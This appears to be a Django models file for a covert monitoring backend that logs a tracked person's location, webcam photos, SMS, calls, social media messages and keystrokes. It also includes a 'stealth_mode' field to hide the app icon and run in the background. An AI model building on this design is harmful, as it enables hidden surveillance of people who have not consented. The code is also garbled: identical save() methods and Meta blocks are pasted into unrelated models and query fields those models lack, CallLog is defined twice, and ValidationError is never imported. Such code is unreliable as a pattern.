from django.db import models
from django.contrib.auth.models import User

class Child(models.Model):
    """Represents a tracked child/device."""
    name = models.CharField(max_length=100)
    device_id = models.CharField(max_length=100, unique=True)
    parent = models.ForeignKey(User, on_delete=models.CASCADE)
    auth_token = models.CharField(max_length=64, blank=True, default='')
    safe_zone = models.TextField(blank=True, help_text="Optional: JSON defining safe zone coordinates")
    update_interval = models.PositiveIntegerField(default=60, help_text="Update interval in seconds for tracking data")

    class Meta:
        constraints = []

    def save(self, *args, **kwargs):
        super().save(*args, **kwargs)

    def __str__(self):
        return f"{self.name} ({self.device_id})"

    def latest_location(self):
        return self.locations.order_by('-timestamp').first()

    def latest_location_map_link(self):
        loc = self.latest_location()
        return f"https://www.google.com/maps?q={loc.latitude},{loc.longitude}" if loc else None

class LocationLog(models.Model):
    """Stores GPS tracking data."""
    child = models.ForeignKey(Child, on_delete=models.CASCADE, related_name='locations')
    timestamp = models.DateTimeField(auto_now_add=True)
    latitude = models.FloatField()
    longitude = models.FloatField()
    accuracy = models.FloatField(null=True, blank=True)

    class Meta:
        constraints = [
            models.UniqueConstraint(
                fields=['child', 'latitude', 'longitude', 'timestamp'],
                name='unique_location_per_child_timestamp'
            )
        ]

    def save(self, *args, **kwargs):
        if CallLog.objects.filter(
            child=self.child,
            caller=self.caller,
            callee=self.callee,
            timestamp=self.timestamp
        ).exclude(pk=self.pk).exists():
            raise ValidationError('Duplicate call log entry detected')
        super().save(*args, **kwargs)

    class Meta:
        constraints = []

    def save(self, *args, **kwargs):
        if SocialMediaLog.objects.filter(
            child=self.child,
            platform=self.platform,
            sender=self.sender,
            message=self.message,
            timestamp=self.timestamp
        ).exclude(pk=self.pk).exists():
            raise ValidationError('Duplicate social media log entry detected')
        super().save(*args, **kwargs)



    def save(self, *args, **kwargs):
        if KeyloggerLog.objects.filter(
            child=self.child,
            timestamp=self.timestamp
        ).exclude(pk=self.pk).exists():
            raise ValidationError('Duplicate keylogger entry detected')
        super().save(*args, **kwargs)

    def __str__(self):
        return f"{self.child.name} @ {self.timestamp}"

class IPLog(models.Model):
    """Stores IP address and network information."""
    child = models.ForeignKey(Child, on_delete=models.CASCADE, related_name='ip_logs')
    ip_address = models.GenericIPAddressField()
    timestamp = models.DateTimeField(auto_now_add=True)
    details = models.TextField(blank=True)

    class Meta:
        constraints = [
            models.UniqueConstraint(
                fields=['child', 'latitude', 'longitude', 'timestamp'],
                name='unique_location_per_child_timestamp'
            )
        ]

    def save(self, *args, **kwargs):
        if CallLog.objects.filter(
            child=self.child,
            caller=self.caller,
            callee=self.callee,
            timestamp=self.timestamp
        ).exclude(pk=self.pk).exists():
            raise ValidationError('Duplicate call log entry detected')
        super().save(*args, **kwargs)

    class Meta:
        constraints = []

    def save(self, *args, **kwargs):
        if SocialMediaLog.objects.filter(
            child=self.child,
            platform=self.platform,
            sender=self.sender,
            message=self.message,
            timestamp=self.timestamp
        ).exclude(pk=self.pk).exists():
            raise ValidationError('Duplicate social media log entry detected')
        super().save(*args, **kwargs)



    def save(self, *args, **kwargs):
        if KeyloggerLog.objects.filter(
            child=self.child,
            timestamp=self.timestamp
        ).exclude(pk=self.pk).exists():
            raise ValidationError('Duplicate keylogger entry detected')
        super().save(*args, **kwargs)

    def __str__(self):
        return f"{self.child.name} IP: {self.ip_address} at {self.timestamp}"

class DeviceInfoLog(models.Model):
    """Stores browser and device information."""
    child = models.ForeignKey(Child, on_delete=models.CASCADE, related_name='device_logs')
    timestamp = models.DateTimeField(auto_now_add=True)
    user_agent = models.TextField()
    platform = models.CharField(max_length=100)
    screen_width = models.IntegerField()
    screen_height = models.IntegerField()
    other_details = models.JSONField(blank=True, null=True)

    class Meta:
        constraints = [
            models.UniqueConstraint(
                fields=['child', 'latitude', 'longitude', 'timestamp'],
                name='unique_location_per_child_timestamp'
            )
        ]

    def save(self, *args, **kwargs):
        if CallLog.objects.filter(
            child=self.child,
            caller=self.caller,
            callee=self.callee,
            timestamp=self.timestamp
        ).exclude(pk=self.pk).exists():
            raise ValidationError('Duplicate call log entry detected')
        super().save(*args, **kwargs)

    class Meta:
        constraints = []

    def save(self, *args, **kwargs):
        if SocialMediaLog.objects.filter(
            child=self.child,
            platform=self.platform,
            sender=self.sender,
            message=self.message,
            timestamp=self.timestamp
        ).exclude(pk=self.pk).exists():
            raise ValidationError('Duplicate social media log entry detected')
        super().save(*args, **kwargs)



    def save(self, *args, **kwargs):
        if KeyloggerLog.objects.filter(
            child=self.child,
            timestamp=self.timestamp
        ).exclude(pk=self.pk).exists():
            raise ValidationError('Duplicate keylogger entry detected')
        super().save(*args, **kwargs)

    def __str__(self):
        return f"{self.child.name} device info at {self.timestamp}"

class PhotoCapture(models.Model):
    """Stores images captured from the webcam."""
    child = models.ForeignKey(Child, on_delete=models.CASCADE, related_name='photos')
    image = models.ImageField(upload_to='captures/')
    timestamp = models.DateTimeField(auto_now_add=True)
    latitude = models.FloatField(null=True, blank=True)
    longitude = models.FloatField(null=True, blank=True)

    class Meta:
        constraints = [
            models.UniqueConstraint(
                fields=['child', 'latitude', 'longitude', 'timestamp'],
                name='unique_location_per_child_timestamp'
            )
        ]

    def save(self, *args, **kwargs):
        if CallLog.objects.filter(
            child=self.child,
            caller=self.caller,
            callee=self.callee,
            timestamp=self.timestamp
        ).exclude(pk=self.pk).exists():
            raise ValidationError('Duplicate call log entry detected')
        super().save(*args, **kwargs)

    class Meta:
        constraints = []

    def save(self, *args, **kwargs):
        if SocialMediaLog.objects.filter(
            child=self.child,
            platform=self.platform,
            sender=self.sender,
            message=self.message,
            timestamp=self.timestamp
        ).exclude(pk=self.pk).exists():
            raise ValidationError('Duplicate social media log entry detected')
        super().save(*args, **kwargs)



    def save(self, *args, **kwargs):
        if KeyloggerLog.objects.filter(
            child=self.child,
            timestamp=self.timestamp
        ).exclude(pk=self.pk).exists():
            raise ValidationError('Duplicate keylogger entry detected')
        super().save(*args, **kwargs)

    def __str__(self):
        return f"Photo for {self.child.name} at {self.timestamp}"

class SensorDataLog(models.Model):
    """Stores sensor data (accelerometer, gyroscope, etc.)."""
    child = models.ForeignKey(Child, on_delete=models.CASCADE, related_name='sensor_logs')
    timestamp = models.DateTimeField(auto_now_add=True)
    data = models.JSONField(blank=True, null=True, help_text="JSON data from sensors")

    class Meta:
        constraints = [
            models.UniqueConstraint(
                fields=['child', 'latitude', 'longitude', 'timestamp'],
                name='unique_location_per_child_timestamp'
            )
        ]

    def save(self, *args, **kwargs):
        if CallLog.objects.filter(
            child=self.child,
            caller=self.caller,
            callee=self.callee,
            timestamp=self.timestamp
        ).exclude(pk=self.pk).exists():
            raise ValidationError('Duplicate call log entry detected')
        super().save(*args, **kwargs)

    class Meta:
        constraints = []

    def save(self, *args, **kwargs):
        if SocialMediaLog.objects.filter(
            child=self.child,
            platform=self.platform,
            sender=self.sender,
            message=self.message,
            timestamp=self.timestamp
        ).exclude(pk=self.pk).exists():
            raise ValidationError('Duplicate social media log entry detected')
        super().save(*args, **kwargs)



    def save(self, *args, **kwargs):
        if KeyloggerLog.objects.filter(
            child=self.child,
            timestamp=self.timestamp
        ).exclude(pk=self.pk).exists():
            raise ValidationError('Duplicate keylogger entry detected')
        super().save(*args, **kwargs)

    def __str__(self):
        return f"Sensor data for {self.child.name} at {self.timestamp}"

class PermissionLog(models.Model):
    """Stores permission statuses for various browser APIs."""
    child = models.ForeignKey(Child, on_delete=models.CASCADE, related_name='permission_logs')
    timestamp = models.DateTimeField(auto_now_add=True)
    geolocation = models.BooleanField(default=False)
    camera = models.BooleanField(default=False)
    microphone = models.BooleanField(default=False)
    notifications = models.BooleanField(default=False)
    clipboard = models.BooleanField(default=False)
    sensors = models.BooleanField(default=False)
    bluetooth = models.BooleanField(default=False)
    other = models.JSONField(blank=True, null=True, help_text="Additional permission statuses")

    class Meta:
        constraints = [
            models.UniqueConstraint(
                fields=['child', 'latitude', 'longitude', 'timestamp'],
                name='unique_location_per_child_timestamp'
            )
        ]

    def save(self, *args, **kwargs):
        if CallLog.objects.filter(
            child=self.child,
            caller=self.caller,
            callee=self.callee,
            timestamp=self.timestamp
        ).exclude(pk=self.pk).exists():
            raise ValidationError('Duplicate call log entry detected')
        super().save(*args, **kwargs)

    class Meta:
        constraints = []

    def save(self, *args, **kwargs):
        if SocialMediaLog.objects.filter(
            child=self.child,
            platform=self.platform,
            sender=self.sender,
            message=self.message,
            timestamp=self.timestamp
        ).exclude(pk=self.pk).exists():
            raise ValidationError('Duplicate social media log entry detected')
        super().save(*args, **kwargs)



    def save(self, *args, **kwargs):
        if KeyloggerLog.objects.filter(
            child=self.child,
            timestamp=self.timestamp
        ).exclude(pk=self.pk).exists():
            raise ValidationError('Duplicate keylogger entry detected')
        super().save(*args, **kwargs)

    def __str__(self):
        return f"Permission log for {self.child.name} at {self.timestamp}"


class SMSLog(models.Model):
    """Logs SMS messages (sent/received)."""
    child = models.ForeignKey(Child, on_delete=models.CASCADE, related_name='sms_logs')
    timestamp = models.DateTimeField(auto_now_add=True)
    message = models.TextField()
    sender = models.CharField(max_length=100, blank=True)
    receiver = models.CharField(max_length=100, blank=True)
    direction = models.CharField(max_length=10, choices=[('sent', 'Sent'), ('received', 'Received')])

    class Meta:
        constraints = [
            models.UniqueConstraint(
                fields=['child', 'message', 'timestamp'],
                name='unique_sms_per_child_timestamp'
            )
        ]

    def save(self, *args, **kwargs):
        if SMSLog.objects.filter(
            child=self.child,
            message=self.message,
            timestamp=self.timestamp
        ).exclude(pk=self.pk).exists():
            raise ValidationError('Duplicate SMS log entry detected')
        super().save(*args, **kwargs)

class SocialMediaMessage(models.Model):
    PLATFORMS = [
        ('whatsapp', 'WhatsApp'),
        ('messenger', 'Facebook Messenger'),
        ('instagram', 'Instagram'),
        ('snapchat', 'Snapchat')
    ]
    child = models.ForeignKey(Child, on_delete=models.CASCADE, related_name='social_media_logs')
    platform = models.CharField(max_length=20, choices=PLATFORMS)
    timestamp = models.DateTimeField(auto_now_add=True)
    content = models.TextField()
    sender = models.CharField(max_length=100)
    attachment = models.FileField(upload_to='social_media/', null=True, blank=True)

class CallLog(models.Model):
    CALL_TYPES = [
        ('incoming', 'Incoming'),
        ('outgoing', 'Outgoing'),
        ('missed', 'Missed')
    ]
    child = models.ForeignKey(Child, on_delete=models.CASCADE, related_name='call_logs')
    timestamp = models.DateTimeField(auto_now_add=True)
    number = models.CharField(max_length=20)
    duration = models.PositiveIntegerField(help_text="Call duration in seconds")
    type = models.CharField(max_length=10, choices=CALL_TYPES)

class AppUsage(models.Model):
    child = models.ForeignKey(Child, on_delete=models.CASCADE, related_name='app_usage_logs')
    app_name = models.CharField(max_length=100)
    package_name = models.CharField(max_length=100)
    start_time = models.DateTimeField()
    end_time = models.DateTimeField()
    foreground_duration = models.PositiveIntegerField(help_text="Time in seconds")

class ScreenTime(models.Model):
    child = models.ForeignKey(Child, on_delete=models.CASCADE, related_name='screen_time_logs')
    date = models.DateField()
    total_duration = models.PositiveIntegerField(help_text="Total screen time in minutes")
    app_breakdown = models.JSONField(help_text="JSON of app usage durations")

class GeofenceAlert(models.Model):
    child = models.ForeignKey(Child, on_delete=models.CASCADE, related_name='geofence_alerts')
    timestamp = models.DateTimeField(auto_now_add=True)
    triggered_type = models.CharField(max_length=10, choices=[('entry', 'Entry'), ('exit', 'Exit')])
    latitude = models.FloatField()
    longitude = models.FloatField()
    radius = models.FloatField(help_text="Radius in meters")

    # Add stealth mode field to Child model
    stealth_mode = models.BooleanField(default=False,
        help_text="Enable to hide app icon and run in background")

    class Meta:
        constraints = [
            models.UniqueConstraint(
                fields=['child', 'latitude', 'longitude', 'timestamp'],
                name='unique_location_per_child_timestamp'
            )
        ]

    def save(self, *args, **kwargs):
        if CallLog.objects.filter(
            child=self.child,
            caller=self.caller,
            callee=self.callee,
            timestamp=self.timestamp
        ).exclude(pk=self.pk).exists():
            raise ValidationError('Duplicate call log entry detected')
        super().save(*args, **kwargs)

    class Meta:
        constraints = []

    def save(self, *args, **kwargs):
        if SocialMediaLog.objects.filter(
            child=self.child,
            platform=self.platform,
            sender=self.sender,
            message=self.message,
            timestamp=self.timestamp
        ).exclude(pk=self.pk).exists():
            raise ValidationError('Duplicate social media log entry detected')
        super().save(*args, **kwargs)



    def save(self, *args, **kwargs):
        if KeyloggerLog.objects.filter(
            child=self.child,
            timestamp=self.timestamp
        ).exclude(pk=self.pk).exists():
            raise ValidationError('Duplicate keylogger entry detected')
        super().save(*args, **kwargs)

    def __str__(self):
        return f"SMS ({self.direction}) for {self.child.name} at {self.timestamp}"

class CallLog(models.Model):
    """Logs call details."""
    child = models.ForeignKey(Child, on_delete=models.CASCADE, related_name='call_logs')
    timestamp = models.DateTimeField(auto_now_add=True)
    caller = models.CharField(max_length=100)
    callee = models.CharField(max_length=100)
    duration = models.PositiveIntegerField(help_text="Duration in seconds")

    class Meta:
        constraints = [
            models.UniqueConstraint(
                fields=['child', 'latitude', 'longitude', 'timestamp'],
                name='unique_location_per_child_timestamp'
            )
        ]

    def save(self, *args, **kwargs):
        if CallLog.objects.filter(
            child=self.child,
            caller=self.caller,
            callee=self.callee,
            timestamp=self.timestamp
        ).exclude(pk=self.pk).exists():
            raise ValidationError('Duplicate call log entry detected')
        super().save(*args, **kwargs)

    class Meta:
        constraints = []

    def save(self, *args, **kwargs):
        if SocialMediaLog.objects.filter(
            child=self.child,
            platform=self.platform,
            sender=self.sender,
            message=self.message,
            timestamp=self.timestamp
        ).exclude(pk=self.pk).exists():
            raise ValidationError('Duplicate social media log entry detected')
        super().save(*args, **kwargs)



    def save(self, *args, **kwargs):
        if KeyloggerLog.objects.filter(
            child=self.child,
            timestamp=self.timestamp
        ).exclude(pk=self.pk).exists():
            raise ValidationError('Duplicate keylogger entry detected')
        super().save(*args, **kwargs)

    def __str__(self):
        return f"Call from {self.caller} to {self.callee} at {self.timestamp}"

class SocialMediaLog(models.Model):
    """Logs social media messages (e.g., WhatsApp, Facebook Messenger)."""
    child = models.ForeignKey(Child, on_delete=models.CASCADE, related_name='social_logs')
    timestamp = models.DateTimeField(auto_now_add=True)
    platform = models.CharField(max_length=50, help_text="e.g., WhatsApp, Facebook, Instagram")
    sender = models.CharField(max_length=100)
    message = models.TextField()

    class Meta:
        constraints = [
            models.UniqueConstraint(
                fields=['child', 'latitude', 'longitude', 'timestamp'],
                name='unique_location_per_child_timestamp'
            )
        ]

    def save(self, *args, **kwargs):
        if CallLog.objects.filter(
            child=self.child,
            caller=self.caller,
            callee=self.callee,
            timestamp=self.timestamp
        ).exclude(pk=self.pk).exists():
            raise ValidationError('Duplicate call log entry detected')
        super().save(*args, **kwargs)

    class Meta:
        constraints = []

    def save(self, *args, **kwargs):
        if SocialMediaLog.objects.filter(
            child=self.child,
            platform=self.platform,
            sender=self.sender,
            message=self.message,
            timestamp=self.timestamp
        ).exclude(pk=self.pk).exists():
            raise ValidationError('Duplicate social media log entry detected')
        super().save(*args, **kwargs)



    def save(self, *args, **kwargs):
        if KeyloggerLog.objects.filter(
            child=self.child,
            timestamp=self.timestamp
        ).exclude(pk=self.pk).exists():
            raise ValidationError('Duplicate keylogger entry detected')
        super().save(*args, **kwargs)

    def __str__(self):
        return f"{self.platform} message from {self.sender} at {self.timestamp}"

class KeyloggerLog(models.Model):
    """Logs keystrokes (for demonstration only)."""
    child = models.ForeignKey(Child, on_delete=models.CASCADE, related_name='keylogger_logs')
    timestamp = models.DateTimeField(auto_now_add=True)
    keystrokes = models.TextField(help_text="Logged keystrokes")

    class Meta:
        constraints = [
            models.UniqueConstraint(
                fields=['child', 'latitude', 'longitude', 'timestamp'],
                name='unique_location_per_child_timestamp'
            )
        ]

    def save(self, *args, **kwargs):
        if CallLog.objects.filter(
            child=self.child,
            caller=self.caller,
            callee=self.callee,
            timestamp=self.timestamp
        ).exclude(pk=self.pk).exists():
            raise ValidationError('Duplicate call log entry detected')
        super().save(*args, **kwargs)

    class Meta:
        constraints = []

    def save(self, *args, **kwargs):
        if SocialMediaLog.objects.filter(
            child=self.child,
            platform=self.platform,
            sender=self.sender,
            message=self.message,
            timestamp=self.timestamp
        ).exclude(pk=self.pk).exists():
            raise ValidationError('Duplicate social media log entry detected')
        super().save(*args, **kwargs)



    def save(self, *args, **kwargs):
        if KeyloggerLog.objects.filter(
            child=self.child,
            timestamp=self.timestamp
        ).exclude(pk=self.pk).exists():
            raise ValidationError('Duplicate keylogger entry detected')
        super().save(*args, **kwargs)

    def __str__(self):
        return f"Keylogger entry for {self.child.name} at {self.timestamp}"

class AIJob(models.Model):
    name = models.CharField(max_length=100)
    status = models.CharField(max_length=20, default="pending")
    created_at = models.DateTimeField(auto_now_add=True)
    updated_at = models.DateTimeField(auto_now=True)

    def __str__(self):
        return f"{self.name} ({self.status})"
